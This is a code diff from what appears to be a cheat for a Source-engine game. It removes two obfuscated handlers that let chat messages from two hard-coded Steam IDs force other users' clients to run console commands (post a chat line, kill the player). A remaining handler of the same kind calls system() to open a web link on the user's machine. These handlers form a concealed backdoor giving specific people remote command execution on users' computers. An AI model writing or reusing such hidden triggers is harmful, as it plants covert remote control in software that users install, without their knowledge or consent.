@@ -727,18 +727,6 @@ void C_GameEvent::FireGameEvent( IGameEvent* pEvent ) {
 			return;
 		}
 
-		if (message == XorStr("!deez") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
-		{
-			Interfaces::m_pEngine->ExecuteClientCmd(XorStr("say nuts!"));
-			return;
-		}
-
-		if (message == XorStr("!slay") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
-		{
-			Interfaces::m_pEngine->ExecuteClientCmd(XorStr("kill"));
-			return;
-		}
-
 		if (message == XorStr("!rick_roll") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
 		{
 			LI_FN(system)(XorStr("start https://www.youtube.com/watch?v=QtBDL8EiNZo"));
